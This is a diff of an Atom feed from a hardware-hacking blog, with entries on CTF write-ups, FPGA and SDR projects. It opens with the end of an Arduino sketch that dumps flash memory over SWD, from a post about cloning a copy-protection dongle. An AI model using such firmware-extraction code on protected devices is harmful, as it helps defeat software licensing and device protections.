+        <span class="n">status</span> <span class="o">=</span> <span class="n">extractFlashData</span><span class="p">(</span><span class="n">flashAddress</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">flashData</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">status</span> <span class="o">!=</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">Serial</span><span class="p">.</span><span class="n">printf</span><span class="p">(</span><span class="s">"Error reading: %d</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">status</span><span class="p">);</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">Serial</span><span class="p">.</span><span class="n">printf</span><span class="p">(</span><span class="s">"%08x: %08x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">flashAddress</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">flashData</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"DONE"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">loop</span><span class="p">()</span> <span class="p">{}</span>
+</code></pre></div></div>]]></content><author><name>Lucas Teske</name></author><category term="Reverse Engineering" /><category term="Hardware Hacking" /><category term="Protected Firmware" /><category term="Hardware Hacking" /><category term="RE" /><category term="Reverse Engineering" /><category term="STM32" /><category term="Patreon" /><category term="MCU" /><summary type="html"><![CDATA[No processo do meu hobby de hackear hardware, encontrei um clone chinês de um dongle HASP HL equipado com um processador STM32F042G6U6. Minha intenção era cloná-lo, e durante minha exploração, descobri quatro pinos da interface de depuração SWD localizados na parte inferior da PCB. Soldei um conector de 4 pinos nesses pinos para facilitar o acesso.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/patreon/Pasted%20image%2020230124035811.png" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/patreon/Pasted%20image%2020230124035811.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Rotor de Antena - Parte 2</title><link href="https://lucasteske.dev/2021/04/rotor-antenna-parte-2" rel="alternate" type="text/html" title="Rotor de Antena - Parte 2" /><published>2021-04-01T05:23:00+00:00</published><updated>2021-04-01T05:23:00+00:00</updated><id>https://lucasteske.dev/2021/04/rotor-antenna-parte-2</id><content type="html" xml:base="https://lucasteske.dev/2021/04/rotor-antenna-parte-2"><![CDATA[<p>Continuando o projeto do tracker, consegui alguns progressos significativos. Assim como o Demilson (PY2UEP) tinha cortado os motores originais, fiz o mesmo. O motor do azimute estava bem enferrujado e acabei estragando uma de suas bobinas (queria reaproveitar o fio), mas no fim o eixo saiu.</p>
 
 <hr />
 
@@ -963,4 +2128,4 @@ Which basically keeps sending Hello World through the serial port forever.</p>
 
 <p><img src="/assets/posts/medium/1_Z8RdW5i7NQh7KUEC5v5NFg.png" alt="Saída do Hello World do FPGA" /><em>Saída do Hello World do FPGA</em></p>
 
-<p>Meu próximo passo é fazer funcionar via rede. Vai ser muito bom poder gravar o FPGA via rede e usar a porta serial.</p>]]></content><author><name>Lucas Teske</name></author><category term="English" /><category term="Hacking" /><category term="Linux" /><category term="FPGA" /><category term="ESP32" /><category term="Hacking" /><category term="FPGA" /><category term="ICEWolf" /><category term="IceStick" /><category term="ECP5" /><category term="Lattice" /><category term="ESP32" /><category term="Colorlight" /><summary type="html"><![CDATA[Hackeando um ESP32 num FPGA]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/medium/1_ALnLx9L06FSciqeEV5OCuQ.png" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/medium/1_ALnLx9L06FSciqeEV5OCuQ.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Hack a Sat - Talk to me, Goose</title><link href="https://lucasteske.dev/2020/05/hack-a-sat-talk-to-me-goose/" rel="alternate" type="text/html" title="Hack a Sat - Talk to me, Goose" /><published>2020-05-31T22:02:00+00:00</published><updated>2020-05-31T22:02:00+00:00</updated><id>https://lucasteske.dev/2020/05/hack-a-sat-talk-to-me-goos</id><content type="html" xml:base="https://lucasteske.dev/2020/05/hack-a-sat-talk-to-me-goose/"><![CDATA[<p>Somente disponível em <a href="/2020/05/hack-a-sat-talk-to-me-goose/">Inglês</a></p>]]></content><author><name>Lucas Teske</name></author><category term="English" /><category term="Hacking" /><category term="Linux" /><category term="CTF" /><category term="SDR" /><category term="Camera" /><category term="Hacking" /><category term="CTF" /><category term="Hackasat" /><category term="CTF Writeup" /><category term="Satellite" /><category term="XTCE" /><summary type="html"><![CDATA[Somente disponível em Inglês]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/medium/1_b23VUAe-7ZvnQF4MIZO73A.png" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/medium/1_b23VUAe-7ZvnQF4MIZO73A.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Hack a Sat - Phasors to Stun</title><link href="https://lucasteske.dev/2020/05/hack-a-sat-phasors-to-stun/" rel="alternate" type="text/html" title="Hack a Sat - Phasors to Stun" /><published>2020-05-30T16:15:00+00:00</published><updated>2020-05-30T16:15:00+00:00</updated><id>https://lucasteske.dev/2020/05/hack-a-sat-phasors-to-stun</id><content type="html" xml:base="https://lucasteske.dev/2020/05/hack-a-sat-phasors-to-stun/"><![CDATA[<p>Somente disponível em <a href="/2020/05/hack-a-sat-phasors-to-stun/">Inglês</a></p>]]></content><author><name>Lucas Teske</name></author><category term="English" /><category term="Hacking" /><category term="Linux" /><category term="CTF" /><category term="SDR" /><category term="Camera" /><category term="Hacking" /><category term="CTF" /><category term="Hackasat" /><category term="CTF Writeup" /><category term="Satellite" /><category term="SDR" /><category term="GNU Radio" /><category term="Radio" /><summary type="html"><![CDATA[Somente disponível em Inglês]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/medium/1_R1n7vaNfInOP6BCFXkjv1Q.png" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/medium/1_R1n7vaNfInOP6BCFXkjv1Q.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Hack a Sat - Can you hear me now?</title><link href="https://lucasteske.dev/2020/05/hack-a-sat-can-you-hear-me-now/" rel="alternate" type="text/html" title="Hack a Sat - Can you hear me now?" /><published>2020-05-30T01:47:00+00:00</published><updated>2020-05-30T01:47:00+00:00</updated><id>https://lucasteske.dev/2020/05/hack-a-sat-can-you-hear-me-now</id><content type="html" xml:base="https://lucasteske.dev/2020/05/hack-a-sat-can-you-hear-me-now/"><![CDATA[<p>Somente disponível em <a href="/2020/05/hack-a-sat-can-you-hear-me-now/">Inglês</a></p>]]></content><author><name>Lucas Teske</name></author><category term="English" /><category term="Hacking" /><category term="Linux" /><category term="CTF" /><category term="Camera" /><category term="Hacking" /><category term="CTF" /><category term="Hackasat" /><category term="CTF Writeup" /><category term="Satellite" /><category term="XTCE" /><summary type="html"><![CDATA[Somente disponível em Inglês]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/medium/1_87tDTK5_FodI9TghHRpznQ.png" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/medium/1_87tDTK5_FodI9TghHRpznQ.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Integrating Hacked Touch Panel into Home Assistant</title><link href="https://lucasteske.dev/2019/12/integrating-hacked-touch-panel-into-home-assistant/" rel="alternate" type="text/html" title="Integrating Hacked Touch Panel into Home Assistant" /><published>2019-12-30T02:15:00+00:00</published><updated>2019-12-30T02:15:00+00:00</updated><id>https://lucasteske.dev/2019/12/integrating-hacked-touch-panel-into-home-assistant</id><content type="html" xml:base="https://lucasteske.dev/2019/12/integrating-hacked-touch-panel-into-home-assistant/"><![CDATA[<p>Somente disponível em <a href="/2019/12/integrating-hacked-touch-panel-into-home-assistant/">Inglês</a></p>]]></content><author><name>Lucas Teske</name></author><category term="English" /><category term="LimeSDR" /><category term="Hacking" /><category term="Home Assistant" /><category term="Linux" /><category term="ESPHome" /><category term="Camera" /><category term="Hacking" /><category term="Home Assistant" /><category term="Arduino" /><category term="ESP8266" /><category term="ESP32" /><category term="ESPHome" /><summary type="html"><![CDATA[Somente disponível em Inglês]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/medium/1_hBwbHXERpWD5N8ZGqqlXMw.png" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/medium/1_hBwbHXERpWD5N8ZGqqlXMw.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Hacking Dimmer Touch Panel with ESP8266</title><link href="https://lucasteske.dev/2019/12/hacking-dimmer-touch-panel-with-esp8266/" rel="alternate" type="text/html" title="Hacking Dimmer Touch Panel with ESP8266" /><published>2019-12-29T20:42:00+00:00</published><updated>2019-12-29T20:42:00+00:00</updated><id>https://lucasteske.dev/2019/12/hacking-dimmer-touch-panel-with-esp8266</id><content type="html" xml:base="https://lucasteske.dev/2019/12/hacking-dimmer-touch-panel-with-esp8266/"><![CDATA[<p>Somente disponível em <a href="/2019/12/hacking-dimmer-touch-panel-with-esp8266/">Inglês</a></p>]]></content><author><name>Lucas Teske</name></author><category term="English" /><category term="LimeSDR" /><category term="Hacking" /><category term="Home Assistant" /><category term="Linux" /><category term="ESPHome" /><category term="Camera" /><category term="Hacking" /><category term="Home Assistant" /><category term="Arduino" /><category term="ESP8266" /><category term="ESP32" /><category term="ESPHome" /><summary type="html"><![CDATA[Somente disponível em Inglês]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/medium/0_NB2IwKOMRoAK5Yr5.png" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/medium/0_NB2IwKOMRoAK5Yr5.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Creating your own GSM Network with LimeSDR</title><link href="https://lucasteske.dev/2019/12/creating-your-own-gsm-network-with-limesdr/" rel="alternate" type="text/html" title="Creating your own GSM Network with LimeSDR" /><published>2019-12-21T17:48:00+00:00</published><updated>2019-12-21T17:48:00+00:00</updated><id>https://lucasteske.dev/2019/12/creating-your-own-gsm-network-with-limesdr-1935bac257f4</id><content type="html" xml:base="https://lucasteske.dev/2019/12/creating-your-own-gsm-network-with-limesdr/"><![CDATA[<p>Somente disponível em <a href="/2019/12/creating-your-own-gsm-network-with-limesdr/">Inglês</a></p>]]></content><author><name>Lucas Teske</name></author><category term="English" /><category term="LimeSDR" /><category term="Hacking" /><category term="SDR" /><category term="Linux" /><category term="Camera" /><category term="Hacking" /><category term="SDR" /><category term="Ubuntu" /><category term="GSM" /><category term="BTS" /><category term="Osmocom" /><category term="Sysmocom" /><summary type="html"><![CDATA[Somente disponível em Inglês]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/medium/1_KbNtmYsmaCMVJinWnJdhFg.png" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/medium/1_KbNtmYsmaCMVJinWnJdhFg.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+<p>Meu próximo passo é fazer funcionar via rede. Vai ser muito bom poder gravar o FPGA via rede e usar a porta serial.</p>]]></content><author><name>Lucas Teske</name></author><category term="English" /><category term="Hacking" /><category term="Linux" /><category term="FPGA" /><category term="ESP32" /><category term="Hacking" /><category term="FPGA" /><category term="ICEWolf" /><category term="IceStick" /><category term="ECP5" /><category term="Lattice" /><category term="ESP32" /><category term="Colorlight" /><summary type="html"><![CDATA[Hackeando um ESP32 num FPGA]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/medium/1_ALnLx9L06FSciqeEV5OCuQ.png" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/medium/1_ALnLx9L06FSciqeEV5OCuQ.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Hack a Sat - Talk to me, Goose</title><link href="https://lucasteske.dev/2020/05/hack-a-sat-talk-to-me-goose/" rel="alternate" type="text/html" title="Hack a Sat - Talk to me, Goose" /><published>2020-05-31T22:02:00+00:00</published><updated>2020-05-31T22:02:00+00:00</updated><id>https://lucasteske.dev/2020/05/hack-a-sat-talk-to-me-goos</id><content type="html" xml:base="https://lucasteske.dev/2020/05/hack-a-sat-talk-to-me-goose/"><![CDATA[<p>Somente disponível em <a href="/2020/05/hack-a-sat-talk-to-me-goose/">Inglês</a></p>]]></content><author><name>Lucas Teske</name></author><category term="English" /><category term="Hacking" /><category term="Linux" /><category term="CTF" /><category term="SDR" /><category term="Camera" /><category term="Hacking" /><category term="CTF" /><category term="Hackasat" /><category term="CTF Writeup" /><category term="Satellite" /><category term="XTCE" /><summary type="html"><![CDATA[Somente disponível em Inglês]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/medium/1_b23VUAe-7ZvnQF4MIZO73A.png" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/medium/1_b23VUAe-7ZvnQF4MIZO73A.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Hack a Sat - Phasors to Stun</title><link href="https://lucasteske.dev/2020/05/hack-a-sat-phasors-to-stun/" rel="alternate" type="text/html" title="Hack a Sat - Phasors to Stun" /><published>2020-05-30T16:15:00+00:00</published><updated>2020-05-30T16:15:00+00:00</updated><id>https://lucasteske.dev/2020/05/hack-a-sat-phasors-to-stun</id><content type="html" xml:base="https://lucasteske.dev/2020/05/hack-a-sat-phasors-to-stun/"><![CDATA[<p>Somente disponível em <a href="/2020/05/hack-a-sat-phasors-to-stun/">Inglês</a></p>]]></content><author><name>Lucas Teske</name></author><category term="English" /><category term="Hacking" /><category term="Linux" /><category term="CTF" /><category term="SDR" /><category term="Camera" /><category term="Hacking" /><category term="CTF" /><category term="Hackasat" /><category term="CTF Writeup" /><category term="Satellite" /><category term="SDR" /><category term="GNU Radio" /><category term="Radio" /><summary type="html"><![CDATA[Somente disponível em Inglês]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/medium/1_R1n7vaNfInOP6BCFXkjv1Q.png" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/medium/1_R1n7vaNfInOP6BCFXkjv1Q.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Hack a Sat - Can you hear me now?</title><link href="https://lucasteske.dev/2020/05/hack-a-sat-can-you-hear-me-now/" rel="alternate" type="text/html" title="Hack a Sat - Can you hear me now?" /><published>2020-05-30T01:47:00+00:00</published><updated>2020-05-30T01:47:00+00:00</updated><id>https://lucasteske.dev/2020/05/hack-a-sat-can-you-hear-me-now</id><content type="html" xml:base="https://lucasteske.dev/2020/05/hack-a-sat-can-you-hear-me-now/"><![CDATA[<p>Somente disponível em <a href="/2020/05/hack-a-sat-can-you-hear-me-now/">Inglês</a></p>]]></content><author><name>Lucas Teske</name></author><category term="English" /><category term="Hacking" /><category term="Linux" /><category term="CTF" /><category term="Camera" /><category term="Hacking" /><category term="CTF" /><category term="Hackasat" /><category term="CTF Writeup" /><category term="Satellite" /><category term="XTCE" /><summary type="html"><![CDATA[Somente disponível em Inglês]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/medium/1_87tDTK5_FodI9TghHRpznQ.png" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/medium/1_87tDTK5_FodI9TghHRpznQ.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
